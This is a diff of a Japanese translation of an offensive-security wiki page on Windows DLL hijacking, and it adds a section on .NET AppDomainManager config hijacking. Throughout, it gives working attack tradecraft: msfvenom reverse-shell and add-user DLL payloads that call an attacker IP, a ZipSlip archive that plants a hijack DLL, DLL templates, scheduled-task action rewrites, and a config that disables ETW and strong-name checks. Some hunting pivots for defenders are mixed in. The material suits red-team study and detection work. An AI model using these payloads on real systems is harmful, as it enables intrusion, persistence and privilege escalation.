@@ -5,25 +5,25 @@
 
 ## Basic Information
 
-DLL Hijacking は、信頼されたアプリケーションに悪意ある DLL を読み込ませるよう操作することを指します。この用語には、**DLL Spoofing, Injection, Side-Loading** などの複数の手法が含まれます。主に code execution、persistence、そしてそれほど一般的ではない privilege escalation に使われます。ここでは escalation に焦点を当てていますが、hijacking の手法自体は目的が違っても一貫しています。
+DLL Hijacking とは、信頼されたアプリケーションを操作して悪意のある DLL を読み込ませる手法です。この用語には、**DLL Spoofing, Injection, Side-Loading** などの複数の戦術が含まれます。主に code execution、persistency の確立、そしてあまり一般的ではないものの privilege escalation に使われます。ここでは escalation に焦点を当てていますが、hijacking の手法自体は目的にかかわらず一貫しています。
 
 ### Common Techniques
 
-DLL hijacking にはいくつかの方法があり、効果はアプリケーションの DLL 読み込み戦略によって異なります。
+DLL hijacking にはいくつかの方法があり、各手法の有効性はアプリケーションの DLL 読み込み戦略によって異なります。
 
-1. **DLL Replacement**: 正規の DLL を悪意あるものに差し替える。必要に応じて DLL Proxying を使い、元の DLL の機能を維持する。
-2. **DLL Search Order Hijacking**: 悪意ある DLL を、正規のものより先に検索されるパスに置き、アプリケーションの検索順を悪用する。
-3. **Phantom DLL Hijacking**: 存在しない必要 DLL だとアプリケーションに思わせて、読み込ませるための悪意ある DLL を作成する。
-4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメータを変更し、アプリケーションを悪意ある DLL に誘導する。
-5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内で正規の DLL を悪意あるものに置き換える手法で、DLL side-loading と関連付けられることが多い。
-6. **Relative Path DLL Hijacking**: コピーしたアプリケーションと一緒に、ユーザーが制御できるディレクトリに悪意ある DLL を置く。Binary Proxy Execution techniques に似ている。
+1. **DLL Replacement**: 正規の DLL を悪意のあるものに置き換えます。必要に応じて DLL Proxying を使い、元の DLL の機能を維持できます。
+2. **DLL Search Order Hijacking**: 悪意のある DLL を正規のものより前に検索されるパスへ配置し、アプリケーションの検索順序を悪用します。
+3. **Phantom DLL Hijacking**: 存在しないはずの必要 DLL として、アプリケーションに悪意のある DLL を読み込ませます。
+4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメータを変更し、アプリケーションを悪意のある DLL へ誘導します。
+5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内で正規の DLL を悪意のあるものに置き換える手法で、DLL side-loading と関連付けられることが多いです。
+6. **Relative Path DLL Hijacking**: ユーザーが制御できるディレクトリに、コピーしたアプリケーションと一緒に悪意のある DLL を配置する手法で、Binary Proxy Execution techniques に似ています。
 
 
 ### AppDomainManager hijacking (`<exe>.config` + attacker assembly)
 
-Classic DLL sideloading は、信頼された **.NET Framework** プロセスに attacker code を読み込ませる唯一の方法ではありません。ターゲットの実行ファイルが **managed** アプリケーションなら、CLR は実行ファイル名に対応する **application configuration file** も参照します（例: `Setup.exe.config`）。そのファイルではカスタム **AppDomainManager** を定義できます。config が EXE の隣に置かれた attacker-controlled assembly を指していると、CLR はそれを**アプリケーションの通常の code path より前に**読み込み、信頼されたプロセス内で実行します。
+Classic DLL sideloading は、信頼された **.NET Framework** プロセスに attacker code を読み込ませる唯一の方法ではありません。対象の実行ファイルが **managed** application の場合、CLR は実行ファイル名に対応する **application configuration file** も参照します（例: `Setup.exe.config`）。そのファイルでカスタム **AppDomainManager** を定義できます。config が EXE の横に置かれた attacker-controlled assembly を指している場合、CLR はそれを **application's normal code path** より前に読み込み、信頼されたプロセス内で実行します。
 
-Microsoft の .NET Framework configuration schema によると、カスタム manager を使うには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が存在する必要があります。
+Microsoft の .NET Framework configuration schema によると、カスタム manager を使用するには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が必要です。
 
 Minimal config:
 ```xml
@@ -44,48 +44,48 @@ MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0
 }
 }
 ```
-実践的な注意点:
-- これは **.NET Framework 固有** の tradecraft です。Win32 の DLL search order ではなく、CLR config の解析に依存します。
-- ホストは本当に **managed EXE** である必要があります。簡易確認: `sigcheck -m target.exe`, `corflags target.exe`、または PE メタデータ内の **CLR Runtime Header** を確認します。
-- config ファイル名は実行ファイル名と完全一致する必要があります（`<binary>.config`）。通常は **EXE の隣** に置かれます。
-- これは **signed Microsoft/vendor binaries** と相性が良いです。信頼された EXE 自体は変更せず、悪意ある managed assembly が in-process で実行されます。
-- すでに書き込み可能な installer/update ディレクトリがあるなら、AppDomainManager hijacking は **first stage** として使えます。その後の stage では、従来の DLL sideloading や reflective loading に繋げられます。
+実践的な注意:
+- これは **.NET Framework specific** の tradecraft です。Win32 DLL search order ではなく、CLR config parsing に依存します。
+- ホストは本当に **managed EXE** である必要があります。簡易確認: `sigcheck -m target.exe`, `corflags target.exe`, または PE metadata 内の **CLR Runtime Header** を確認します。
+- config ファイル名は実行ファイル名と完全一致する必要があります (`<binary>.config`)。通常は **EXE の隣** に置かれます。
+- これは **signed Microsoft/vendor binaries** と組み合わせると有用です。信頼された EXE 自体は変更せず、malicious managed assembly が in-process で実行されます。
+- すでに書き込み可能な installer/update ディレクトリがあるなら、AppDomainManager hijacking を **first stage** として使い、その後の stage で classic DLL sideloading か reflective loading を使えます。
 
-### 既存の scheduled task を hijack して sideload chain を再実行する
+### 既存の scheduled task を hijacking して sideload chain を再起動する
 
-Persistence のために、**新しい task を作成する** ことだけを見ないでください。侵入グループの中には、正規の installer が **通常の updater task** を作成するのを待ち、その後 **task action を書き換えて**、既存の名前、author、trigger が defenders から見て自然なままになるようにするものがあります。
+persistence のために、**新しい task を作成する** ことだけを探さないでください。intrusion set の中には、正規の installer が **normal updater task** を作成するまで待ち、その後に **task action を rewrite** して、既存の name、author、trigger を defender にとって見慣れたままにするものがあります。
 
-再利用可能なワークフロー:
-1. 正規ソフトウェアを install/run し、通常作成される task を特定します。
-2. task XML を export して、現在の `<Exec><Command>` / `<Arguments>` の値を確認します。
-3. action だけを置き換え、task がユーザー書き込み可能な staging ディレクトリ内の **trusted host EXE** を起動するようにします。その後、その EXE が real payload を side-load または AppDomain-load します。
-4. 新しい目立つ persistence artifact を作るのではなく、同じ task 名で再登録します。
+再利用可能な workflow:
+1. 正規ソフトウェアを install/run して、通常作成される task を特定します。
+2. task XML を export し、現在の `<Exec><Command>` / `<Arguments>` の値を確認します。
+3. action だけを置き換えて、task が user-writable な staging directory から **trusted host EXE** を起動するようにし、その後に real payload を side-load するか AppDomain-load します。
+4. 目立つ新しい persistence artifact を作らず、同じ task name を再登録します。
 ```cmd
 schtasks /query /tn "<TaskName>" /xml > task.xml
 :: edit the <Exec><Command> and optional <Arguments> nodes
 schtasks /create /tn "<TaskName>" /xml task.xml /f
 ```
-Why it is stealthier:
-- The task name can still look legitimate (for example a vendor updater).
-- The **Task Scheduler service** launches it, so parent/ancestor validation often sees the expected scheduling chain instead of `explorer.exe`.
-- DFIR teams that only hunt for **new task names** may miss a task whose registration already existed but whose action now points to `%LOCALAPPDATA%`, `%APPDATA%`, or another attacker-controlled path.
+なぜより stealthy か:
+- タスク名は依然として正当そうに見えることがある（たとえば vendor updater）。
+- **Task Scheduler service** がそれを起動するため、parent/ancestor validation では `explorer.exe` ではなく、期待される scheduling chain が見えることが多い。
+- **新しい task names** だけを探す DFIR チームは、登録自体は既に存在していたが action が `%LOCALAPPDATA%`、`%APPDATA%`、または他の attacker-controlled path を指すようになった task を見逃すことがある。
 
 Fast hunting pivots:
 - `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
 - `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
-- Compare `C:\Windows\System32\Tasks\*` XML and `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata against a baseline.
-- Alert when a **vendor-looking updater task** executes from **user-writable directories** or launches a .NET EXE with a colocated `*.config` file.
+- `C:\Windows\System32\Tasks\*` の XML と `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` の metadata を baseline と比較する。
+- **vendor-looking updater task** が **user-writable directories** から実行されたり、同じ場所にある `*.config` file を伴う .NET EXE を起動したら alert する。
 
 > [!TIP]
-> For a step-by-step chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.
+> DLL sideloading の上に HTML staging、AES-CTR configs、.NET implants を重ねる step-by-step chain については、以下の workflow を確認してください。
 
 {{#ref}}
 advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Missing Dlls の見つけ方
+## Missing Dlls を見つける
 
-システム内で missing Dlls を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つのフィルタを設定する**ことです:
+system 内で missing Dlls を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つの filters を設定する**ことです:
 
 ![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)
 
@@ -95,62 +95,62 @@ advanced-html-staged-dll-sideloading.md
 
 ![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)
 
-**missing dlls 全般**を探している場合は、これを**数秒間**そのまま動かします。\
-特定の実行ファイル内の**missing dll**を探している場合は、**"Process Name" "contains" `<exec name>` のような別のフィルタを設定し、実行して、イベント収集を停止**します。
+**missing dlls 全般** を探している場合は、これを **数秒** そのまま動かします。\
+特定の executable 内の **missing dll** を探している場合は、**別の filter で "Process Name" "contains" `<exec name>` を設定し、実行して、event capture を停止** します。
 
-## Exploiting Missing Dlls
+## Missing Dlls の Exploiting
 
-権限昇格のために最も有効なのは、**特権プロセスが読み込もうとする dll を書き込める**ことです。その dll が検索される**場所のいずれか**に dll を置ければよいのです。したがって、**元の dll** があるフォルダよりも前に検索されるフォルダに dll を**書き込める**場合（特殊なケース）、または、dll が検索されるフォルダのどこかに**書き込めて**、かつ元の **dll** がどのフォルダにも存在しない場合に成立します。
+privilege escalation を行うには、最善の機会は、**privilege process が load しようとする dll を書き込める**ことです。その dll が **search される場所** のどこかに置ける必要があります。つまり、**元の dll** がある folder よりも先に **search される folder** に dll を **書き込める**（珍しいケース）か、あるいは dll が **search される folder** に **書き込めて**、しかもどの folder にも original **dll が存在しない**、という状況を作れます。
 
 ### Dll Search Order
 
-[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **では、Dll が具体的にどのように読み込まれるかを確認できます。**
+[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) の中で、Dll が具体的にどう load されるかを確認できます。
 
-**Windows applications** は、あらかじめ定義された一連の **search paths** に従って DLL を探し、特定の順序で処理します。DLL hijacking の問題は、悪意ある DLL をこれらのディレクトリのいずれかに戦略的に配置することで、本物の DLL より先に読み込ませられるときに発生します。これを防ぐ解決策は、アプリケーションが必要とする DLL を参照するときに絶対パスを使うことです。
+**Windows applications** は、あらかじめ定義された **search paths** に従って DLL を探し、特定の順序で参照します。DLL hijacking の問題は、悪意ある DLL をこれらの directory のいずれかに戦略的に配置し、正規の DLL より先に load されるようにすることで発生します。これを防ぐには、application が必要な DLL を参照する際に absolute paths を使うようにすることです。
 
-32-bit システムでの **DLL search order** は以下のとおりです:
+32-bit system の **DLL search order** は以下のとおりです。
 
-1. アプリケーションが読み込まれたディレクトリ。
-2. system directory. このディレクトリのパスを取得するには [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使います。(_C:\Windows\System32_)
-3. 16-bit system directory. このディレクトリのパスを取得する関数はありませんが、検索対象にはなります。(_C:\Windows\System_)
-4. Windows directory. このディレクトリのパスを取得するには [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使います。
+1. application が load された directory
+2. system directory. この directory の path を取得するには [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function を使います。(_C:\Windows\System32_)
+3. 16-bit system directory. この directory の path を取得する function はありませんが、search されます。(_C:\Windows\System_)
+4. Windows directory. この directory の path を取得するには [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function を使います。
 1. (_C:\Windows_)
-5. current directory.
-6. PATH 環境変数に列挙されたディレクトリ。これは **App Paths** レジストリキーで指定されるアプリケーションごとの path を含まないことに注意してください。**App Paths** キーは DLL search path の計算には使われません。
+5. current directory
+6. PATH environment variable に list されている directories。これは **App Paths** registry key で指定される per-application path を含まないことに注意してください。**App Paths** key は DLL search path の計算には使われません。
 
-これが **SafeDllSearchMode** が有効な場合の**既定**の search order です。無効にすると current directory が 2 番目に上がります。これを無効化するには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成して 0 に設定します（既定では有効）。
+これは **SafeDllSearchMode** が有効なときの **default** search order です。無効にすると current directory は 2 番目に昇格します。これを無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value を作成し、0 に設定します（default は有効）。
 
-[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** とともに呼ばれた場合、search は **LoadLibraryEx** が読み込んでいる実行モジュールのディレクトリから始まります。
+[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function が **LOAD_WITH_ALTERED_SEARCH_PATH** 付きで呼ばれると、search は **LoadLibraryEx** が load している executable module の directory から始まります。
 
-最後に、**dll は名前ではなく絶対パスを指定して読み込まれる**ことがある点に注意してください。その場合、その dll は**その path でのみ検索されます**（dll に依存関係がある場合、それらは名前で読み込まれたのと同様に検索されます）。
+最後に、**dll は名前だけでなく absolute path を指定して load されることもある**点に注意してください。その場合、その dll は **その path の中だけで search** されます（dll に依存関係がある場合、それらは名前だけで load されたのと同様に search されます）。
 
-search order を変更する他の方法もありますが、ここでは説明しません。
+search order を変える他の方法もありますが、ここでは説明しません。
 
-### 任意ファイル書き込みを missing-DLL hijack に連鎖させる
+### 任意の file write を missing-DLL hijack に chain する
 
-1. **ProcMon** フィルタ（`Process Name` = 対象 EXE、`Path` が `.dll` で終わる、`Result` = `NAME NOT FOUND`）を使って、プロセスが探すが見つけられない DLL 名を収集します。
-2. バイナリが **schedule/service** 上で動作する場合、そうした名前の DLL を **application directory**（search-order の 1 番目）に置くと、次回実行時に読み込まれます。ある .NET scanner のケースでは、プロセスは本物のコピーを `C:\Program Files\dotnet\fxr\...` から読み込む前に、`C:\samples\app\` で `hostfxr.dll` を探していました。
-3. 任意の export を持つ payload DLL（例: reverse shell）を作成します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
-4. primitive が **ZipSlip-style arbitrary write** なら、展開先ディレクトリを抜ける ZIP エントリを作り、DLL が app folder に置かれるようにします:
+1. **ProcMon** filters（`Process Name` = target EXE、`Path` が `.dll` で終わる、`Result` = `NAME NOT FOUND`）を使って、process が probe するが見つけられない DLL 名を収集する。
+2. binary が **schedule/service** で動く場合、その DLL 名のひとつを **application directory**（search-order の #1）に drop すると、次回 execution で load される。ある .NET scanner case では、process は `C:\Program Files\dotnet\fxr\...` から real copy を load する前に `C:\samples\app\` 内の `hostfxr.dll` を探していた。
+3. 任意の export を持つ payload DLL（たとえば reverse shell）を build する: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
+4. primitive が **ZipSlip-style arbitrary write** なら、extract 先ディレクトリから escape して DLL が app folder に置かれるように ZIP を craft する:
 ```python
 import zipfile
 with zipfile.ZipFile("slip-shell.zip", "w") as z:
 z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
 ```
-5. アーカイブを監視対象の inbox/share に配信する; scheduled task が process を再起動すると、malicious DLL がロードされ、service account としてあなたの code が実行される。
+5. アーカイブを監視対象の inbox/share に届ける; scheduled task がプロセスを再起動すると、malicious DLL が読み込まれ、service account としてあなたの code が実行される。
 
-### RTL_USER_PROCESS_PARAMETERS.DllPath を使って sideloading を強制する
+### RTL_USER_PROCESS_PARAMETERS.DllPath による sideloading の強制
 
-新しく作成される process の DLL search path を決定的に操作する高度な方法は、ntdll の native APIs を使って process を作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに attacker-controlled な directory を指定すると、import された DLL を名前だけで解決する target process（absolute path を使わず、safe loading flags も使わない）は、その directory から malicious DLL を load するよう強制できます。
+新しく作成されるプロセスの DLL search path を決定的に制御する高度な方法は、ntdll の native APIs を使ってプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに attacker-controlled な directory を指定すると、名前で imported DLL を解決する target process（absolute path を使わず、safe loading flags も使わない）は、その directory から malicious DLL を読み込むよう強制できます。
 
 Key idea
-- RtlCreateProcessParametersEx で process parameters を構築し、制御下の folder（例: dropper/unpacker が置かれている directory）を指す custom DllPath を指定する。
-- RtlCreateUserProcess で process を作成する。target binary が DLL を名前で解決するとき、loader は resolution 中にこの supplied DllPath を参照するため、malicious DLL が target EXE と同じ場所になくても reliable に sideloading できる。
+- RtlCreateProcessParametersEx で process parameters を構築し、制御下の folder を指す custom DllPath を指定する（たとえば dropper/unpacker が置かれている directory）。
+- RtlCreateUserProcess で process を作成する。target binary が DLL を名前で解決すると、loader は解決時にこの指定された DllPath を参照し、malicious DLL が target EXE と同じ場所にない場合でも reliable な sideloading を可能にする。
 
 Notes/limitations
-- これは作成される child process に影響する; current process のみに影響する SetDllDirectory とは異なる。
-- target は DLL を名前で import するか LoadLibrary しなければならない（absolute path ではなく、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使わない）。
-- KnownDLLs と hardcoded absolute paths は hijack できない。forwarded exports と SxS により優先順位が変わる場合がある。
+- これは作成される child process に影響する; current process のみに作用する SetDllDirectory とは異なる。
+- target は DLL を名前で import または LoadLibrary する必要がある（absolute path を使わず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories も使わない）。
+- KnownDLLs や hardcoded absolute paths は hijack できない。forwarded exports と SxS により precedence が変わる場合がある。
 
 Minimal C example (ntdll, wide strings, simplified error handling):
 
@@ -229,11 +229,58 @@ return 0;
 </details>
 
 Operational usage example
-- 悪意のある xmllite.dll（必要な関数を export するか、real one を proxying する）をあなたの DllPath ディレクトリに配置する。
-- 上記の technique を使って、xmllite.dll を名前で参照することが分かっている signed binary を起動する。loader は supplied DllPath を通じて import を解決し、あなたの DLL を sideload する。
+- DllPath ディレクトリに、悪意のある xmllite.dll（必要な関数を export するか、real one に proxying する）を配置する。
+- 上記の technique を使って、xmllite.dll を名前で look up することが知られている signed binary を起動する。loader は supplied DllPath を介して import を resolve し、あなたの DLL を sideloads する。
 
 This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.
 
+
+### .NET AppDomainManager hijacking via `.exe.config`
+
+**.NET Framework** targets では、sideloading はアプリケーションに隣接する **`.exe.config`** ファイルを悪用することで、メモリを patching せずに **`Main()`** の前に実行できる。Win32 DLL search order のみに依存する代わりに、攻撃者は正規の .NET EXE の隣に悪意のある config と、1つ以上の attacker-controlled assemblies を配置する。
+
+チェーンの動作は次のとおり:
+1. host EXE が起動し、**CLR が `<exe>.config`** を読み込む。
+2. config は **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を設定し、runtime が attacker-controlled な `AppDomainManager` を instantiate する。
+3. 悪意のある manager は trusted host process 内で **pre-`Main()` execution** を得る。
+4. 同じ config により、CLR に local assemblies を先に resolve させることができ（たとえば `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`）、inline patching なしで runtime validation/telemetry を弱められる。
+
+Campaign-style pattern (exact nesting can vary by directive / CLR version):
+```xml
+<configuration>
+<runtime>
+<appDomainManagerAssembly value="Updater" />
+<appDomainManagerType value="MyAppDomainManager" />
+<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
+<probing privatePath="." />
+<publisherPolicy apply="no" />
+</assemblyBinding>
+<bypassTrustedAppStrongNames enabled="true" />
+<etwEnable enabled="false" />
+</runtime>
+<startup>
+<requiredRuntime version="v4.0.30319" safemode="true" />
+</startup>
+</configuration>
+```
+Why this is useful:
+- **`<probing privatePath="."/>`** は assembly resolution をアプリケーションディレクトリ内に固定し、そのフォルダを予測可能な sideloading surface にします。
+- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** は CLR 初期化中、正規の app ロジックが実行される前に、実行を attacker code に移します。
+- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trust app が strong-name validation failure なしで unsigned または tampered assemblies を読み込める場合があります。
+- **`<publisherPolicy apply="no"/>`** は、新しい assemblies への publisher-policy redirects を回避します。
+- **`<requiredRuntime ... safemode="true"/>`** は runtime selection をより deterministic にします。
+- **`<etwEnable enabled="false"/>`** は特に興味深く、**CLR が自分自身の ETW visibility を configuration から無効化**しており、implant がメモリ上で `EtwEventWrite` を patch する必要がありません。
+
+Operational pattern seen in recent campaigns:
+- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
+- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
+- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.
+
+Hunting ideas:
+- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
+- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
+- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
+- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.
 
 #### Exceptions on dll search order from Windows docs
 
@@ -262,7 +309,7 @@ icacls "C:\Python27"
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-また、以下を使って executable の imports と dll の exports を確認することもできます:
+実行ファイルの imports と dll の exports は、次のように確認できます:
 ```bash
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
@@ -276,21 +323,21 @@ writable-sys-path-dll-hijacking-privesc.md
 
 ### Automated tools
 
-[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH 内の任意のフォルダに書き込み権限があるかどうかを確認します。\
-この脆弱性を見つける他の興味深い自動ツールは、**PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._ です。
+[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH内の任意のfolderに書き込み権限があるかを確認します。\
+他にこの脆弱性を見つけるのに役立つ自動化ツールとしては、**PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ と _Write-HijackDll_ があります。
 
 ### Example
 
-悪用可能なシナリオを見つけた場合、それを正常に悪用するために最も重要なことの1つは、**実行ファイルがそこから import する全ての関数を少なくとも export する dll を作成すること**です。とはいえ、Dll Hijacking は [Medium Integrity level から High **(bypassing UAC)** へ昇格する](../../authentication-credentials-uac-and-efs/index.html#uac) ため、または[ **High Integrity から SYSTEM** へ](../index.html#from-high-integrity-to-system)**.** ために便利です。**有効な dll を作成する方法** の例は、実行用途の dll hijacking に焦点を当てたこの研究の中にあります: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-さらに、**次のセクション**では、**テンプレート**として使えたり、**必要でない関数だけを export した dll** を作成するのに役立つ、いくつかの**基本的な dll コード**を見つけられます。
+悪用可能なシナリオを見つけた場合、成功させるために最も重要なことの1つは、**実行ファイルがそこからimportする関数を少なくともすべてexportするdllを作成すること**です。とはいえ、Dll Hijackingは [**Medium Integrity levelからHighへ昇格する（UAC bypass）**](../../authentication-credentials-uac-and-efs/index.html#uac) ときや、[ **High IntegrityからSYSTEMへ**](../index.html#from-high-integrity-to-system)**.** 昇格するときに便利です。**有効なdllを作成する方法**の例は、execution向けのdll hijackingに焦点を当てたこの調査記事の中にあります: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+さらに、**次のセクション**では、**テンプレート**として役立つ、または**必要ない関数をexportしたdllを作成する**のに使える、いくつかの**基本的なdllコード**を見つけられます。
 
 ## **Creating and compiling Dlls**
 
 ### **Dll Proxifying**
 
-基本的に **Dll proxy** とは、ロードされたときに**悪意あるコードを実行**できる一方で、**本来のライブラリへ全ての呼び出しを relay することで**、**期待通りに expose** され **動作** する Dll のことです。
+基本的に、**Dll proxy** とは、**読み込まれたときに悪意あるコードを実行できる**一方で、**実際のlibraryへのすべてのcallをrelayすることで**、**期待どおりに** **expose** され、**動作**できる Dll のことです。
 
-ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使うと、**実行ファイルを指定して proxify したいライブラリを選び、proxified dll を生成**するか、**Dll を指定して proxified dll を生成**できます。
+ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使うと、**executableを指定してproxifyしたい libraryを選び、proxified dllを生成する**か、**Dllを指定してproxified dllを生成する**ことができます。
 
 ### **Meterpreter**
 
@@ -302,13 +349,13 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**ユーザーを作成する (x86版のみで、x64版は見つかりませんでした):**
+**ユーザーを作成する (x86 版のみで、x64 版は見当たりませんでした):**
 ```bash
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
-### 自分の
+### 自作のもの
 
-いくつかのケースでは、コンパイルするDllは、被害者プロセスによって読み込まれる **複数の関数をexport** する必要があります。これらの関数が存在しない場合、**binary はそれらをloadできず**、**exploit は失敗**します。
+いくつかのケースでは、コンパイルした Dll は、被害者プロセスによって読み込まれる**複数の関数を export**する必要があります。これらの関数が存在しない場合、**binary は読み込めず**、**exploit は失敗**します。
 
 <details>
 <summary>C DLL template (Win10)</summary>
@@ -347,7 +394,7 @@ return TRUE;
 }
 ```
 <details>
-<summary>ユーザー作成付きのC++ DLL例</summary>
+<summary>ユーザー作成を伴う C++ DLL の例</summary>
 ```c
 //x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
 //x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
@@ -370,7 +417,7 @@ return 0;
 </details>
 
 <details>
-<summary>スレッドエントリ付きの代替 C DLL</summary>
+<summary>スレッドエントリを持つ別のC DLL</summary>
 ```c
 //Another possible DLL
 // i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll
@@ -398,18 +445,18 @@ return TRUE;
 ```
 </details>
 
-## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)
+## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)
 
-Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を今でも探索し、arbitrary code execution と persistence に悪用できます。
+Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を引き続き探索し、任意コード実行と persistence に悪用される可能性があります。
 
 Key facts
 - Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
 - Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
-- もし writable な attacker-controlled DLL が OneCore path に存在すれば、それが load され、`DllMain(DLL_PROCESS_ATTACH)` が実行されます。exports は不要です。
+- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` が実行されます。exports は不要です。
 
 Discovery with Procmon
 - Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
-- Narrator を start し、上記 path の load 試行を observe します。
+- Start Narrator and observe the attempted load of the above path.
 
 Minimal DLL
 ```c
@@ -424,39 +471,39 @@ return TRUE;
 }
 ```
 OPSEC silence
-- 単純な hijack は UI を読み上げ/強調表示します。静かにするには、attach 時に Narrator の threads を列挙し、main thread を `OpenThread(THREAD_SUSPEND_RESUME)` で開いて `SuspendThread` します。続きは自分の thread で実行してください。完全な code は PoC を参照してください。
